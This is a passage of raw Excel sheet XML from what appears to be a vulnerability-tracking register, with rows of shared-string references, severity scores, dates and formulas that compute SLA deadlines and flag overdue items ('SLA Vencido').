        <f t="shared" ref="U536:U546" ca="1" si="34">TODAY()-T536</f>
        <v>221</v>
      </c>
      <c r="V536" s="1">
        <f t="shared" si="28"/>
        <v>45998</v>
      </c>
      <c r="W536" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB536" s="65" t="s">
        <v>1984</v>
      </c>
      <c r="AC536" s="65" t="s">
        <v>1985</v>
      </c>
      <c r="AD536" s="65" t="s">
        <v>1986</v>
      </c>
      <c r="AE536" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG536" s="65" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="537" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A537" s="50">
        <v>536</v>
      </c>
      <c r="B537" t="s">
        <v>32</v>
      </c>
      <c r="C537" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D537" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G537" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H537" t="s">
        <v>1988</v>
      </c>
      <c r="I537" t="s">
        <v>1989</v>
      </c>
      <c r="J537" t="s">
        <v>80</v>
      </c>
      <c r="L537" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M537" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N537">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q537" t="s">
        <v>1990</v>
      </c>
      <c r="T537" s="1">
        <v>45992</v>
      </c>
      <c r="U537" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>217</v>
      </c>
      <c r="V537" s="1">
        <f t="shared" si="28"/>
        <v>46082</v>
      </c>
      <c r="W537" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB537" s="65" t="s">
        <v>1991</v>
      </c>
      <c r="AC537" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD537" s="65" t="s">
        <v>1993</v>
      </c>
      <c r="AE537" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG537" s="65" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="538" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A538" s="50">
        <v>537</v>
      </c>
      <c r="B538" t="s">
        <v>32</v>
      </c>
      <c r="C538" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D538" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G538" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H538" t="s">
        <v>1994</v>
      </c>
      <c r="I538" t="s">
        <v>1995</v>
      </c>
      <c r="J538" t="s">
        <v>1198</v>
      </c>
      <c r="L538" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M538" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N538">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q538" t="s">
        <v>1996</v>
      </c>
      <c r="T538" s="1">
        <v>45992</v>
      </c>
      <c r="U538" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>217</v>
      </c>
      <c r="V538" s="1">
        <f t="shared" ref="V538:V539" si="35">IF(M538="Critical",T538+10,IF(M538="High",T538+30,IF(M538="Bad",T538+30,IF(M538="Medium",T538+90,IF(M538="Warm",T538+90,IF(M538="Low",T538+120,IF(M538="Fair",T538+120,IF(M538="Neutral",T538+120,""))))))))</f>
        <v>46082</v>
      </c>
      <c r="W538" s="76" t="str">
        <f t="shared" ref="W538:W539" ca="1" si="36">IF(M538="Critical",IF(U538&gt;10,"SLA Vencido","En SLA"),IF(M538="High",IF(U538&gt;30,"SLA Vencido","En SLA"),IF(M538="Bad",IF(U538&gt;30,"SLA Vencido","En SLA"),IF(M538="Medium",IF(U538&gt;90,"SLA Vencido","En SLA"),IF(M538="Warm",IF(U538&gt;90,"SLA Vencido","En SLA"),IF(M538="Low",IF(U538&gt;120,"SLA Vencido","En SLA"),IF(M538="Fair",IF(U538&gt;120,"SLA Vencido","En SLA"),IF(M538="Neutral",IF(U538&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB538" s="65" t="s">
        <v>1997</v>
      </c>
      <c r="AC538" s="65" t="s">
        <v>1998</v>
      </c>
      <c r="AD538" s="65" t="s">
        <v>1999</v>
      </c>
      <c r="AE538" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG538" s="65" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="539" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A539" s="50">
        <v>538</v>
      </c>
      <c r="B539" t="s">
        <v>32</v>
      </c>
      <c r="C539" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D539" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G539" s="60" t="s">
        <v>2000</v>
      </c>
      <c r="H539" t="s">
        <v>2001</v>
      </c>
      <c r="I539" t="s">
        <v>2002</v>
      </c>
      <c r="J539" t="s">
        <v>2003</v>
      </c>
      <c r="L539" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M539" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N539">
        <v>3</v>
      </c>
      <c r="Q539" s="87" t="s">
        <v>2004</v>
      </c>
      <c r="T539" s="1">
        <v>46013</v>
      </c>
      <c r="U539" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>196</v>
      </c>
      <c r="V539" s="1">
        <f t="shared" si="35"/>
        <v>46103</v>
      </c>
      <c r="W539" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB539" s="65" t="s">
        <v>2005</v>
      </c>
      <c r="AC539" s="65" t="s">
        <v>2006</v>
      </c>
      <c r="AD539" s="65" t="s">
        <v>2007</v>
      </c>
      <c r="AE539" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG539" s="65" t="s">
        <v>2008</v>
      </c>
    </row>
    <row r="540" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A540" s="50">
        <v>539</v>
      </c>
      <c r="B540" t="s">
        <v>32</v>
      </c>
      <c r="C540" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D540" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G540" s="60" t="s">
        <v>2000</v>
      </c>
      <c r="I540" t="s">
        <v>2009</v>
      </c>
      <c r="J540" t="s">
        <v>2010</v>
      </c>
      <c r="L540" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M540" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N540">
        <v>4.3</v>
      </c>
      <c r="Q540" s="87" t="s">
        <v>2011</v>
      </c>
      <c r="T540" s="1">
        <v>46013</v>
      </c>
      <c r="U540" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>196</v>
      </c>
      <c r="V540" s="1">
        <f t="shared" ref="V540:V541" si="37">IF(M540="Critical",T540+10,IF(M540="High",T540+30,IF(M540="Bad",T540+30,IF(M540="Medium",T540+90,IF(M540="Warm",T540+90,IF(M540="Low",T540+120,IF(M540="Fair",T540+120,IF(M540="Neutral",T540+120,""))))))))</f>
        <v>46103</v>
      </c>
      <c r="W540" s="76" t="str">
        <f t="shared" ref="W540:W541" ca="1" si="38">IF(M540="Critical",IF(U540&gt;10,"SLA Vencido","En SLA"),IF(M540="High",IF(U540&gt;30,"SLA Vencido","En SLA"),IF(M540="Bad",IF(U540&gt;30,"SLA Vencido","En SLA"),IF(M540="Medium",IF(U540&gt;90,"SLA Vencido","En SLA"),IF(M540="Warm",IF(U540&gt;90,"SLA Vencido","En SLA"),IF(M540="Low",IF(U540&gt;120,"SLA Vencido","En SLA"),IF(M540="Fair",IF(U540&gt;120,"SLA Vencido","En SLA"),IF(M540="Neutral",IF(U540&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB540" s="65" t="s">
        <v>2012</v>
      </c>
      <c r="AC540" s="65" t="s">
        <v>2013</v>
      </c>
      <c r="AD540" s="65" t="s">
        <v>2014</v>
      </c>
      <c r="AE540" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG540" s="65" t="s">
        <v>2008</v>
      </c>
    </row>
    <row r="541" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A541">
        <v>540</v>
      </c>
      <c r="B541" t="s">
        <v>32</v>
      </c>
      <c r="C541" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D541" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G541" t="s">
        <v>2015</v>
      </c>
      <c r="H541" t="s">
        <v>2016</v>
      </c>
      <c r="I541" t="s">
        <v>2017</v>
      </c>
      <c r="J541" t="s">
        <v>2018</v>
      </c>
      <c r="L541" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M541" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N541">
        <v>9.1</v>
      </c>
      <c r="Q541" s="87" t="s">
        <v>2019</v>
      </c>
      <c r="T541" s="1">
        <v>46020</v>
      </c>
      <c r="U541" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>189</v>
      </c>
      <c r="V541" s="1">
        <f t="shared" si="37"/>
        <v>46030</v>
      </c>
      <c r="W541" s="76" t="str">
        <f t="shared" ca="1" si="38"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB541" s="65" t="s">
        <v>2020</v>
      </c>
      <c r="AC541" s="65" t="s">
        <v>2021</v>
      </c>
      <c r="AD541" s="65" t="s">
        <v>2022</v>
      </c>
      <c r="AE541" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG541" s="65" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="542" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A542">
        <v>541</v>
      </c>
      <c r="B542" t="s">
        <v>32</v>
      </c>
      <c r="C542" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D542" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G542" t="s">
        <v>2015</v>
      </c>
      <c r="H542" t="s">
        <v>2024</v>
      </c>
      <c r="I542" t="s">
        <v>2025</v>
      </c>
      <c r="J542" t="s">
        <v>2026</v>
      </c>
      <c r="L542" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M542" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N542">
        <v>7.5</v>
      </c>
      <c r="Q542" s="87" t="s">
        <v>2027</v>
      </c>
      <c r="T542" s="1">
        <v>46020</v>
      </c>
      <c r="U542" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>189</v>
      </c>
      <c r="V542" s="1">
        <f t="shared" ref="V542:V546" si="39">IF(M542="Critical",T542+10,IF(M542="High",T542+30,IF(M542="Bad",T542+30,IF(M542="Medium",T542+90,IF(M542="Warm",T542+90,IF(M542="Low",T542+120,IF(M542="Fair",T542+120,IF(M542="Neutral",T542+120,""))))))))</f>
        <v>46050</v>
      </c>
      <c r="W542" s="76" t="str">
        <f t="shared" ref="W542:W546" ca="1" si="40">IF(M542="Critical",IF(U542&gt;10,"SLA Vencido","En SLA"),IF(M542="High",IF(U542&gt;30,"SLA Vencido","En SLA"),IF(M542="Bad",IF(U542&gt;30,"SLA Vencido","En SLA"),IF(M542="Medium",IF(U542&gt;90,"SLA Vencido","En SLA"),IF(M542="Warm",IF(U542&gt;90,"SLA Vencido","En SLA"),IF(M542="Low",IF(U542&gt;120,"SLA Vencido","En SLA"),IF(M542="Fair",IF(U542&gt;120,"SLA Vencido","En SLA"),IF(M542="Neutral",IF(U542&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB542" s="65" t="s">
        <v>2028</v>
      </c>
      <c r="AC542" s="65" t="s">
        <v>2029</v>
      </c>
      <c r="AD542" s="65" t="s">
        <v>2030</v>
      </c>
      <c r="AE542" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG542" s="65" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="543" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A543" s="84">
        <v>542</v>
      </c>
      <c r="B543" t="s">
        <v>32</v>
      </c>
      <c r="C543" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D543" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G543" t="s">
        <v>2015</v>
      </c>
      <c r="H543" t="s">
        <v>2031</v>
      </c>
      <c r="J543" t="s">
        <v>2032</v>
      </c>
      <c r="L543" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M543" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N543">
        <v>6.6</v>
      </c>
      <c r="Q543" t="s">
        <v>2033</v>
      </c>
      <c r="T543" s="1">
        <v>46024</v>
      </c>
      <c r="U543" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>185</v>
      </c>
      <c r="V543" s="1">
        <f t="shared" si="39"/>
        <v>46114</v>
      </c>
      <c r="W543" s="76" t="str">
        <f t="shared" ca="1" si="40"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB543" s="65" t="s">
        <v>2034</v>
      </c>
      <c r="AC543" s="65" t="s">
        <v>2035</v>
      </c>
      <c r="AE543" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG543" s="65" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="544" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A544" s="84">
        <v>543</v>
      </c>
      <c r="B544" t="s">
        <v>32</v>
      </c>
      <c r="C544" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D544" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G544" t="s">
        <v>2015</v>
      </c>
      <c r="H544" t="s">
        <v>2036</v>
      </c>
      <c r="J544" t="s">
        <v>2026</v>
      </c>
      <c r="L544" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M544" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N544">
        <v>5.3</v>
      </c>
      <c r="Q544" t="s">
        <v>2033</v>
      </c>
      <c r="T544" s="1">
        <v>46024</v>
      </c>
      <c r="U544" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>185</v>
      </c>
      <c r="V544" s="1">
        <f t="shared" si="39"/>
        <v>46114</v>
      </c>
      <c r="W544" s="76" t="str">
        <f t="shared" ca="1" si="40"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB544" s="65" t="s">
        <v>2037</v>
      </c>
      <c r="AC544" s="65" t="s">
        <v>2038</v>
      </c>
      <c r="AE544" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG544" s="65" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="545" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A545" s="84">
        <v>544</v>
      </c>
      <c r="B545" t="s">
        <v>32</v>
      </c>
      <c r="C545" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D545" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G545" t="s">
        <v>2015</v>
      </c>
      <c r="H545" t="s">
        <v>2039</v>
      </c>
      <c r="J545" t="s">
        <v>2040</v>
      </c>
      <c r="L545" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M545" s="50" t="s">
        <v>61</v>
      </c>
      <c r="T545" s="1">
        <v>46024</v>
      </c>
      <c r="U545" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>185</v>
      </c>
      <c r="V545" s="1">
        <f t="shared" si="39"/>
        <v>46114</v>
      </c>
      <c r="W545" s="76" t="str">
        <f t="shared" ca="1" si="40"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB545" t="s">
        <v>2041</v>
      </c>
      <c r="AC545" t="s">
        <v>2042</v>
      </c>
      <c r="AE545" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="546" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A546" s="84">
        <v>545</v>
      </c>
      <c r="B546" t="s">
        <v>32</v>
      </c>
      <c r="C546" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D546" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G546" t="s">
        <v>3454</v>
      </c>
      <c r="H546" t="s">
        <v>3464</v>
      </c>
      <c r="I546" t="s">
        <v>3455</v>
      </c>
      <c r="J546" t="s">
        <v>3457</v>
      </c>
      <c r="L546" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M546" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N546">
        <v>5.4</v>
      </c>
      <c r="Q546" t="s">
        <v>1313</v>
      </c>
      <c r="T546" s="1">
        <v>46062</v>
      </c>
      <c r="U546" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>147</v>
      </c>
      <c r="V546" s="1">
        <f t="shared" si="39"/>
        <v>46152</v>
      </c>
      <c r="W546" s="76" t="str">
        <f t="shared" ca="1" si="40"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB546" s="65" t="s">
        <v>3458</v>
      </c>
      <c r="AC546" s="65" t="s">
        <v>3459</v>
      </c>
      <c r="AD546" s="65" t="s">
        <v>3460</v>
      </c>
      <c r="AE546" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG546" s="65" t="s">
        <v>3462</v>
      </c>
    </row>
    <row r="547" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A547" s="84">
        <v>546</v>
      </c>
      <c r="B547" t="s">
        <v>32</v>
      </c>
      <c r="C547" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D547" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G547" t="s">
        <v>3454</v>
      </c>
      <c r="H547" t="s">
        <v>3465</v>
      </c>
      <c r="I547" t="s">
        <v>3456</v>
      </c>
      <c r="J547" t="s">
        <v>80</v>
      </c>
      <c r="L547" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M547" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N547">
        <v>4.4000000000000004</v>
      </c>
      <c r="Q547" t="s">
        <v>1313</v>
      </c>
      <c r="T547" s="1">
        <v>46062</v>
      </c>
      <c r="U547" s="76">
        <f t="shared" ref="U547" ca="1" si="41">TODAY()-T547</f>
        <v>147</v>
      </c>
      <c r="V547" s="1">
        <f t="shared" ref="V547" si="42">IF(M547="Critical",T547+10,IF(M547="High",T547+30,IF(M547="Bad",T547+30,IF(M547="Medium",T547+90,IF(M547="Warm",T547+90,IF(M547="Low",T547+120,IF(M547="Fair",T547+120,IF(M547="Neutral",T547+120,""))))))))</f>
        <v>46152</v>
      </c>
      <c r="W547" s="76" t="str">
        <f t="shared" ref="W547" ca="1" si="43">IF(M547="Critical",IF(U547&gt;10,"SLA Vencido","En SLA"),IF(M547="High",IF(U547&gt;30,"SLA Vencido","En SLA"),IF(M547="Bad",IF(U547&gt;30,"SLA Vencido","En SLA"),IF(M547="Medium",IF(U547&gt;90,"SLA Vencido","En SLA"),IF(M547="Warm",IF(U547&gt;90,"SLA Vencido","En SLA"),IF(M547="Low",IF(U547&gt;120,"SLA Vencido","En SLA"),IF(M547="Fair",IF(U547&gt;120,"SLA Vencido","En SLA"),IF(M547="Neutral",IF(U547&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB547" s="65" t="s">
        <v>3461</v>
      </c>
      <c r="AC547" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD547" s="65" t="s">
        <v>1993</v>
      </c>
      <c r="AE547" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG547" s="65" t="s">
        <v>3462</v>
      </c>
    </row>
    <row r="548" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A548" s="84">
        <v>547</v>
      </c>
      <c r="B548" t="s">
        <v>32</v>
      </c>
      <c r="C548" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D548" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G548" t="s">
        <v>1323</v>
      </c>
      <c r="H548" t="s">
        <v>3466</v>
      </c>
      <c r="J548" t="s">
        <v>1844</v>
      </c>
      <c r="L548" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M548" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N548">
        <v>7.3</v>
      </c>
      <c r="Q548" t="s">
        <v>3474</v>
      </c>
      <c r="T548" s="1">
        <v>46062</v>
      </c>
      <c r="U548" s="76">
        <f t="shared" ref="U548:U554" ca="1" si="44">TODAY()-T548</f>
        <v>147</v>
      </c>
      <c r="V548" s="1">
        <f t="shared" ref="V548:V554" si="45">IF(M548="Critical",T548+10,IF(M548="High",T548+30,IF(M548="Bad",T548+30,IF(M548="Medium",T548+90,IF(M548="Warm",T548+90,IF(M548="Low",T548+120,IF(M548="Fair",T548+120,IF(M548="Neutral",T548+120,""))))))))</f>
        <v>46092</v>
      </c>
      <c r="W548" s="76" t="str">
        <f t="shared" ref="W548:W554" ca="1" si="46">IF(M548="Critical",IF(U548&gt;10,"SLA Vencido","En SLA"),IF(M548="High",IF(U548&gt;30,"SLA Vencido","En SLA"),IF(M548="Bad",IF(U548&gt;30,"SLA Vencido","En SLA"),IF(M548="Medium",IF(U548&gt;90,"SLA Vencido","En SLA"),IF(M548="Warm",IF(U548&gt;90,"SLA Vencido","En SLA"),IF(M548="Low",IF(U548&gt;120,"SLA Vencido","En SLA"),IF(M548="Fair",IF(U548&gt;120,"SLA Vencido","En SLA"),IF(M548="Neutral",IF(U548&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB548" t="s">
        <v>3477</v>
      </c>
      <c r="AD548" t="s">
        <v>3479</v>
      </c>
      <c r="AE548" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG548" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="549" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A549" s="84">
        <v>548</v>
      </c>
      <c r="B549" t="s">
        <v>32</v>
      </c>
      <c r="C549" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D549" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G549" t="s">
        <v>1323</v>
      </c>
      <c r="H549" t="s">
        <v>3467</v>
      </c>
      <c r="J549" t="s">
        <v>1844</v>
      </c>
      <c r="L549" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M549" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N549">
        <v>7.3</v>
      </c>
      <c r="Q549" t="s">
        <v>3475</v>
      </c>
      <c r="T549" s="1">
        <v>46062</v>
      </c>
      <c r="U549" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V549" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W549" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB549" t="s">
        <v>3477</v>
      </c>
      <c r="AD549" t="s">
        <v>3479</v>
      </c>
      <c r="AE549" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG549" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="550" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A550" s="84">
        <v>549</v>
      </c>
      <c r="B550" t="s">
        <v>32</v>
      </c>
      <c r="C550" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D550" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G550" t="s">
        <v>1323</v>
      </c>
      <c r="H550" t="s">
        <v>3468</v>
      </c>
      <c r="J550" t="s">
        <v>3473</v>
      </c>
      <c r="L550" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M550" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N550">
        <v>7.3</v>
      </c>
      <c r="Q550" t="s">
        <v>3476</v>
      </c>
      <c r="T550" s="1">
        <v>46062</v>
      </c>
      <c r="U550" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V550" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W550" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB550" t="s">
        <v>3478</v>
      </c>
      <c r="AD550" t="s">
        <v>3479</v>
      </c>
      <c r="AE550" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG550" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="551" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A551" s="84">
        <v>550</v>
      </c>
      <c r="B551" t="s">
        <v>32</v>
      </c>
      <c r="C551" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D551" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G551" t="s">
        <v>1323</v>
      </c>
      <c r="H551" t="s">
        <v>3469</v>
      </c>
      <c r="J551" t="s">
        <v>3473</v>
      </c>
      <c r="L551" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M551" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N551">
        <v>7.3</v>
      </c>
      <c r="Q551" t="s">
        <v>3474</v>
      </c>
      <c r="T551" s="1">
        <v>46062</v>
      </c>
      <c r="U551" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V551" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W551" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB551" t="s">
        <v>3478</v>
      </c>
      <c r="AD551" t="s">
        <v>3479</v>
      </c>
      <c r="AE551" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG551" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="552" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A552" s="84">
        <v>551</v>
      </c>
      <c r="B552" t="s">
        <v>32</v>
      </c>
      <c r="C552" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D552" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G552" t="s">
        <v>1323</v>
      </c>
      <c r="H552" t="s">
        <v>3470</v>
      </c>
      <c r="J552" t="s">
        <v>3473</v>
      </c>
      <c r="L552" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M552" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N552">
        <v>7.3</v>
      </c>
      <c r="Q552" t="s">
        <v>1856</v>
      </c>
      <c r="T552" s="1">
        <v>46062</v>
      </c>
      <c r="U552" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V552" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W552" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB552" t="s">
        <v>3478</v>
      </c>
      <c r="AD552" t="s">
        <v>3479</v>
      </c>
      <c r="AE552" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG552" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="553" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A553" s="84">
        <v>552</v>
      </c>
      <c r="B553" t="s">
        <v>32</v>
      </c>
      <c r="C553" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D553" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G553" t="s">
        <v>1323</v>
      </c>
      <c r="H553" t="s">
        <v>3471</v>
      </c>
      <c r="J553" t="s">
        <v>3473</v>
      </c>
      <c r="L553" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M553" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N553">
        <v>7.3</v>
      </c>
      <c r="Q553" t="s">
        <v>3475</v>
      </c>
      <c r="T553" s="1">
        <v>46062</v>
      </c>
      <c r="U553" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V553" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W553" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB553" t="s">
        <v>3478</v>
      </c>
      <c r="AD553" t="s">
        <v>3479</v>
      </c>
      <c r="AE553" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG553" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="554" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A554" s="84">
        <v>553</v>
      </c>
      <c r="B554" t="s">
        <v>32</v>
      </c>
      <c r="C554" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D554" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G554" t="s">
        <v>1323</v>
      </c>
      <c r="H554" t="s">
        <v>3472</v>
      </c>
      <c r="J554" t="s">
        <v>3473</v>
      </c>
      <c r="L554" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M554" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N554">
        <v>7.3</v>
      </c>
      <c r="Q554" t="s">
        <v>1853</v>
      </c>
      <c r="T554" s="1">
        <v>46062</v>
      </c>
      <c r="U554" s="76">
        <f t="shared" ca="1" si="44"/>
        <v>147</v>
      </c>
      <c r="V554" s="1">
        <f t="shared" si="45"/>
        <v>46092</v>
      </c>
      <c r="W554" s="76" t="str">
        <f t="shared" ca="1" si="46"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB554" t="s">
        <v>3478</v>
      </c>
      <c r="AD554" t="s">
        <v>3479</v>
      </c>
      <c r="AE554" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG554" s="65" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="555" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A555" s="84">
        <v>554</v>
      </c>
      <c r="B555" t="s">
        <v>32</v>
      </c>
      <c r="C555" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D555" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G555" t="s">
        <v>3519</v>
      </c>
      <c r="I555" t="s">
        <v>3520</v>
      </c>
      <c r="J555" t="s">
